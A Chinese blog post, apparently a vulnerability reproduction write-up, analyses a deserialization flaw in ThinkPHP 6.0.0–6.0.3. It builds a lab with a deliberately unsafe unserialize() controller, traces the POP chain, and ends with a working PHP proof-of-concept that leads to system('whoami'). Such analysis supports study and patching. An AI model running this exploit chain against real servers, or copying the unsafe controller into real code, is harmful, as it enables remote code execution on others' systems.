@@ -1,0 +1,504 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>ThinkPHP v6.0.x反序列化漏洞复现与分析 | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    ThinkPHP v6.0.x反序列化漏洞复现与分析
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-03-02 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/pe3-Tsqw7/" class="post-tags">
+                            # 漏洞分析
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="thinkphp-v600-603反序列化漏洞复现与分析">thinkPHP v6.0.0-6.0.3反序列化漏洞复现与分析</h1>
+<h2 id="环境搭建">环境搭建</h2>
+<p><strong>初始环境，需要注意的是，新版v6基于</strong><code>PHP7.1+</code><strong>开发</strong></p>
+<pre><code>php-7.2.9
+ThinkPHP v6.0.3
+</code></pre>
+<p><strong>使用</strong><code>composer</code><strong>进行安装</strong></p>
+<pre><code>composer create-project topthink/think=6.0.3 tp6.0
+</code></pre>
+<p><strong>⚠️坑点，截止到</strong><code>2021/09/16</code> <strong>，默认核心安装的为</strong><code>framework=v6.0.9</code> <code>think-orm=2.0.44</code> <strong>但是到最后面部分代码段已经修复了利用点，所以为了避免大家再次踩坑，请部署完成后，请前往</strong><code>composer.json</code> <strong>中，修改核心依赖相关版本，回退更新</strong></p>
+<pre><code>&quot;require&quot;: {
+         &quot;php&quot;: &quot;&gt;=7.1.0&quot;,
+         &quot;topthink/framework&quot;: &quot;6.0.3&quot;,
+         &quot;topthink/think-orm&quot;: &quot;2.0.30&quot;
+     },
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/6ca1308b9744464192e8ea344bfee18f.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>进行回退更新，没有出现报错即成功</strong></p>
+<pre><code>composer update
+</code></pre>
+<p><strong>开启web服务进行验证访问</strong>'</p>
+<pre><code>http://localhost/tp6.0/public/
+</code></pre>
+<p>注意：实际测试需要PHP版本&gt;7.2.5</p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/ef7e6fa21a6e49deb1a4c730f598e509.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>****<code>tp6.0</code> <strong>版本安装后默认使用单应用模式部署，url访问受到路由模式的影响，为了使用方便，我们先要去</strong><code>/config/app.php</code> <strong>中将</strong><code>with_route =&gt; false</code><br>
+<img src="https://img-blog.csdnimg.cn/7cc305d743f14d5593be497e3e3c3cde.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></p>
+<p><strong>访问控制器中的</strong><code>hello</code><strong>方法名，并且传递参数值</strong></p>
+<pre><code>http://localhost/tp6.0/public/index.php/index/hello/name/123
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/b89e516653a347caa3c2456256937ca7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="" loading="lazy"></figure>
+<h2 id="构建反序列化入口">构建反序列化入口</h2>
+<p><strong>需要编写一个控制器模块并存在反序列化可控点，这样才能进行利用</strong></p>
+<pre><code>tp6.0\app\controller\Index.php
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/a9d1cce7427e4ba9baf2ea13ead8776c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<pre><code class="language-php">  public function lyy9(){
+        $tmp = $_POST['lyy9'];
+        echo $tmp;
+        unserialize($tmp);
+    }
+</code></pre>
+<p>访问thinkphp路由</p>
+<pre><code>http://localhost/tp6.0/public/index.php/index/lyy9
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/ad04a0bc859741d48c1f92a2e52eaecd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="" loading="lazy"></figure>
+<p><strong>漏洞分析</strong></p>
+<h3 id="__destruct链条"><strong>__destruct()链条</strong></h3>
+<p><strong>漏洞的一般起点在</strong><code>__destruct()</code> <strong>函数，这次位于</strong><code>/vendor/topthink/think-orm/src/Model.php</code><br>
+<img src="https://img-blog.csdnimg.cn/1e5b52328e0449e1b03282b3f92b6d83.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></p>
+<p><code>this→lazySave</code><strong>可控，跟进</strong><code>save()</code><strong>方法</strong></p>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/1cb27ccc23894144a4c63dc7cc52a4eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>因为之前的</strong><code>__toString()</code><strong>链条仍然可以使用，因此要想办法找一个可以进入到</strong><code>__toString()</code><strong>的点，这里我们关注的是</strong><code>updateData()</code> <strong>所以前面的判断需要让他不成立</strong>，因为是||所以两个都不能为真</p>
+<p><strong>跟进</strong><code>isEmpty()</code></p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/eff7700e23d24f5b8d74f1b8c6a6f288.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>发现</strong><code>$this→data</code><strong>可控，让</strong><code>data[]</code><strong>不为空，则返回</strong><code>false</code> <strong>，第一个条件满足了，再跟进</strong><code>trigger()</code></p>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/0fd66129b7cc4988a641d32d1e71ab5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>可以发现这里</strong><code>$this→withEvent</code><strong>可控，设置</strong><code>withEvent</code><strong>为</strong><code>false</code> <strong>这样就会返回</strong><code>true</code><strong>，这样回到上一层</strong><code>if(false || false === true)</code> <strong>不成立，就会跳过判断</strong></p>
+<p><strong>进入</strong><code>$result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</code></p>
+<p>exists<code> 可控，我们跟进</code>updateData()</p>
+<pre><code class="language-php">    protected function updateData(): bool
+    {
+        // 事件回调
+        if (false === $this-&gt;trigger('BeforeUpdate')) {
+            return false;
+        }
+
+        $this-&gt;checkData();
+
+        // 获取有更新的数据
+        $data = $this-&gt;getChangedData();
+
+        if (empty($data)) {
+            // 关联更新
+            if (!empty($this-&gt;relationWrite)) {
+                $this-&gt;autoRelationUpdate();
+            }
+
+            return true;
+        }
+
+        if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime &amp;&amp; !isset($data[$this-&gt;updateTime])) {
+            // 自动写入更新时间
+            $data[$this-&gt;updateTime]       = $this-&gt;autoWriteTimestamp($this-&gt;updateTime);
+            $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime];
+        }
+
+        // 检查允许字段
+        $allowFields = $this-&gt;checkAllowFields();
+
+        foreach ($this-&gt;relationWrite as $name =&gt; $val) {
+            if (!is_array($val)) {
+                continue;
+            }
+
+            foreach ($val as $key) {
+                if (isset($data[$key])) {
+                    unset($data[$key]);
+                }
+            }
+        }
+
+        // 模型更新
+        $db = $this-&gt;db();
+        $db-&gt;startTrans();
+
+        try {
+            $this-&gt;key = null;
+            $where     = $this-&gt;getWhere();
+
+            $result = $db-&gt;where($where)
+                -&gt;strict(false)
+                -&gt;cache(true)
+                -&gt;setOption('key', $this-&gt;key)
+                -&gt;field($allowFields)
+                -&gt;update($data);
+
+            $this-&gt;checkResult($result);
+
+            // 关联更新
+            if (!empty($this-&gt;relationWrite)) {
+                $this-&gt;autoRelationUpdate();
+            }
+
+            $db-&gt;commit();
+
+            // 更新回调
+            $this-&gt;trigger('AfterUpdate');
+
+            return true;
+        } catch (\Exception $e) {
+            $db-&gt;rollback();
+            throw $e;
+        }
+    }
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/b206f80d95e2402cb3b5ec9709b4aae4.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>这里前面</strong><code>trigger</code> <strong>可控，所以会直接跳过，</strong><code>checkData()</code><strong>并没有定义，也可以直接略过，跟进</strong><code>getChangedData()</code></p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/f1c0fa42990341f687daf2ca278b206e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><code>this→force</code><strong>可控，当为</strong><code>true</code> <strong>时，返回</strong><code>$this→data</code> <strong>，则</strong><code>$data=$this→data</code> <strong>继续向下跟进</strong></p>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/f4eeeb86093a45bcbdf0fe2e82f60b05.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>可以看到，要进入</strong><code>checkAllowFields()</code><strong>，需要进行判断</strong><code>$data</code><strong>是否为空，这里要将</strong><code>$data</code> <strong>置为非空，这样就可以跳过判断，跟进</strong><code>checkAllowFields()</code></p>
+<figure data-type="image" tabindex="12"><img src="https://img-blog.csdnimg.cn/ab9d707e0c7045e78596f1c54c16bb18.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><code>$field</code><strong>和</strong><code>$schema</code> <strong>都可控，当构造为空时，就可以进入</strong><code>db()</code> <strong>方法</strong><br>
+<img src="https://img-blog.csdnimg.cn/70343fe140b1493492d69d3b1d7fc53e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></p>
+<p><strong>可以看到，这里有</strong><code>.</code> <strong>号，当我们进行构造对象进行字符串拼接时，就会触发</strong><code>__toString()</code> <strong>魔术方法</strong></p>
+<p>上半段pop链条</p>
+<pre><code>__destruct()——&gt;save()——&gt;updateData()——&gt;checkAllowFields()——&gt;db()——&gt;$this-&gt;table . $this-&gt;suffix（字符串拼接）——&gt;toString()
+</code></pre>
+<p>参数构造</p>
+<pre><code>$this-&gt;exists = true;
+$this-&gt;$lazySave = true;
+$this-&gt;$withEvent = false;
+</code></pre>
+<h3 id="__tostring链条"><strong>__toString()链条</strong></h3>
+<p>后面就是延续tp5反序列化的触发<code>toString</code>魔术方法了，就是原来vendor/topthink/think-orm/src/model/concern/Conversion.php的__toString开始的利用链<br>
+<img src="https://img-blog.csdnimg.cn/8bbf9391aeab47c8ac80fb8926f30e81.png" alt="在这里插入图片描述" loading="lazy"></p>
+<p><strong>跟进</strong><code>toJson()</code></p>
+<figure data-type="image" tabindex="13"><img src="https://img-blog.csdnimg.cn/bcb79f981c4444dbb0a224f4359c0fb4.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>继续跟进</strong><code>toArray()</code></p>
+<pre><code class="language-php">   public function toArray(): array
+    {
+        $item       = [];
+        $hasVisible = false;
+
+        foreach ($this-&gt;visible as $key =&gt; $val) {
+            if (is_string($val)) {
+                if (strpos($val, '.')) {
+                    [$relation, $name]          = explode('.', $val);
+                    $this-&gt;visible[$relation][] = $name;
+                } else {
+                    $this-&gt;visible[$val] = true;
+                    $hasVisible          = true;
+                }
+                unset($this-&gt;visible[$key]);
+            }
+        }
+
+        foreach ($this-&gt;hidden as $key =&gt; $val) {
+            if (is_string($val)) {
+                if (strpos($val, '.')) {
+                    [$relation, $name]         = explode('.', $val);
+                    $this-&gt;hidden[$relation][] = $name;
+                } else {
+                    $this-&gt;hidden[$val] = true;
+                }
+                unset($this-&gt;hidden[$key]);
+            }
+        }
+
+        // 合并关联数据
+        $data = array_merge($this-&gt;data, $this-&gt;relation);
+
+        foreach ($data as $key =&gt; $val) {
+            if ($val instanceof Model || $val instanceof ModelCollection) {
+                // 关联模型对象
+                if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) {
+                    $val-&gt;visible($this-&gt;visible[$key]);
+                } elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) {
+                    $val-&gt;hidden($this-&gt;hidden[$key]);
+                }
+                // 关联模型对象
+                if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) {
+                    $item[$key] = $val-&gt;toArray();
+                }
+            } elseif (isset($this-&gt;visible[$key])) {
+                $item[$key] = $this-&gt;getAttr($key);
+            } elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) {
+                $item[$key] = $this-&gt;getAttr($key);
+            }
+        }
+
+        // 追加属性（必须定义获取器）
+        foreach ($this-&gt;append as $key =&gt; $name) {
+            $this-&gt;appendAttrToArray($item, $key, $name);
+        }
+
+        return $item;
+    }
+</code></pre>
+<p>第三个foreach里面存在<code>getAttr</code>方法，他是个关键方法，我们需要触发他</p>
+<p>触发条件：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>v</mi><mi>i</mi><mi>s</mi><mi>i</mi><mi>b</mi><mi>l</mi><mi>e</mi><mo>[</mo></mrow><annotation encoding="application/x-tex">this-&gt;visible[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mopen">[</span></span></span></span>key]存在，即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>v</mi><mi>i</mi><mi>s</mi><mi>i</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">存</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">键</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">为</mi></mrow><annotation encoding="application/x-tex">this-&gt;visible存在键名为</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">键</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">为</span></span></span></span>key的键，而<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mi mathvariant="normal">则</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">源</mi><mi mathvariant="normal">于</mi></mrow><annotation encoding="application/x-tex">key则来源于</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">源</span><span class="mord cjk_fallback">于</span></span></span></span>data的键名，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant="normal">则</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">源</mi><mi mathvariant="normal">于</mi></mrow><annotation encoding="application/x-tex">data则来源于</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">源</span><span class="mord cjk_fallback">于</span></span></span></span>this-&gt;data，也就是说<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant="normal">和</mi></mrow><annotation encoding="application/x-tex">this-&gt;data和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">和</span></span></span></span>this-&gt;visible要有相同的键名$key</p>
+<p>然后跟进到<code>getAttr</code></p>
+<figure data-type="image" tabindex="14"><img src="https://img-blog.csdnimg.cn/1b4e534c973e4d3f99853bd6671669d3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>$key值就传入到了getData()方法，跟进getData方法</p>
+<figure data-type="image" tabindex="15"><img src="https://img-blog.csdnimg.cn/1294223fcf584c4ba3bfc5dd2abf9883.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>第一个if判断传入的值,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">空</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">因</mi><mi mathvariant="normal">此</mi><mi mathvariant="normal">绕</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">然</mi><mi mathvariant="normal">后</mi></mrow><annotation encoding="application/x-tex">key值不为空，因此绕过，然后</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">绕</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span></span></span></span>key值传入到了getRealFieldName()方法，跟进<code>getRealFieldName</code>方法</p>
+<figure data-type="image" tabindex="16"><img src="https://img-blog.csdnimg.cn/29d14200c3f945d2a9fdce4cbd78936d.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>当<code>$this-&gt;strict</code>为<code>true</code>时直接返回<code>$name</code>，即<code>$key</code></p>
+<p>回到<code>getData</code>方法，此时<code>$fieldName = $key</code>，进入判断语句：</p>
+<pre><code class="language-php">if (array_key_exists($fieldName, $this-&gt;data)) {
+            return $this-&gt;data[$fieldName];
+        } elseif (array_key_exists($fieldName, $this-&gt;relation)) {
+            return $this-&gt;relation[$fieldName];
+        }
+</code></pre>
+<p>返回<code>$this-&gt;data[$fielName]也就是$this-&gt;data[$key]</code>，记为<code>$value</code></p>
+<p>再回到<code>getAttr</code>，也就是返回 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>g</mi><mi>e</mi><mi>t</mi><mi>V</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">this-&gt;getValue(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mopen">(</span></span></span></span>key, $value, null);</p>
+<p>再跟进到<code>getValue</code></p>
+<figure data-type="image" tabindex="17"><img src="https://img-blog.csdnimg.cn/295649ff309141e796c91fd8dddd9441.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>首先</strong><code>$fieldName=$key</code> <strong>然后进行判断</strong><code>$this→withAttr[$fieldName]</code> <strong>是否存在进入二层判断，默认</strong><code>$relation=false</code> <strong>，不符合，进入下一个判断，默认</strong><code>json</code><strong>为空，主要在后一半</strong><code>$this→withAttr[$fieldName]</code> <strong>是否为数组，最终利用点在于后面的动态函数调用，所以前面两个判断都要绕过。正好</strong><code>withAttr[]</code><strong>我们是可以控制的，只要我们能让</strong><code>$key</code><strong>对应的不为数组就可以绕过</strong></p>
+<pre><code class="language-php">$closure = $this-&gt;withAttr[$fieldName];
+$value   = $closure($value, $this-&gt;data);
+</code></pre>
+<p><strong>前面图中已经很明显写出来</strong><code>$fieldName=$key</code> <code>$value=$this→data[$key]</code></p>
+<p><strong>这样的话，就会把</strong><code>$this-&gt;withAttr[$key]</code><strong>（</strong><code>withAttr</code><strong>数组</strong><code>$key</code><strong>键对应的值）当做函数名动态执行，参数为</strong><code>$value=$this-&gt;data[$key]</code><strong>。</strong></p>
+<p><strong>例如这样进行构造</strong></p>
+<pre><code class="language-php">$this-&gt;withAttr = [&quot;key&quot; =&gt; &quot;system&quot;];
+$this-&gt;data = [&quot;key&quot; =&gt; &quot;whoami&quot;];
+</code></pre>
+<p><strong>最后实际执行的是</strong><code>system(&quot;whoami&quot;)</code></p>
+<p>到这里呈现了一条完整的POP链。</p>
+<pre><code>__toString()--&gt;toJson()--&gt;toArray()--&gt;getAttr()-&gt;getData()-&gt;getRealFieldName()--&gt;getValue()
+</code></pre>
+<h2 id="poc构造">POC构造</h2>
+<pre><code class="language-php">&lt;?php
+ namespace think\model\concern;
+ trait Attribute
+ {
+     private $data = [&quot;key&quot;=&gt;&quot;whoami&quot;];
+     private $withAttr = [&quot;key&quot;=&gt;&quot;system&quot;];
+ }
+ namespace think;
+ abstract class Model
+ {
+     use model\concern\Attribute;
+     private $lazySave = true;
+     protected $withEvent = false;
+     private $exists = true;
+     private $force = true;
+     protected $name;
+     public function __construct($obj=&quot;&quot;){
+         $this-&gt;name=$obj;
+     }
+ }
+ namespace think\model;
+ use think\Model;
+ class Pivot extends Model
+ {}
+ $a=new Pivot();
+ $b=new Pivot($a);
+ echo urlencode(serialize($b));
+</code></pre>
+<p>访问</p>
+<pre><code>http://localhost/tp6.0/public/index.php/index/lyy9
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://img-blog.csdnimg.cn/390ee993d805447b915820ca8330bf56.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
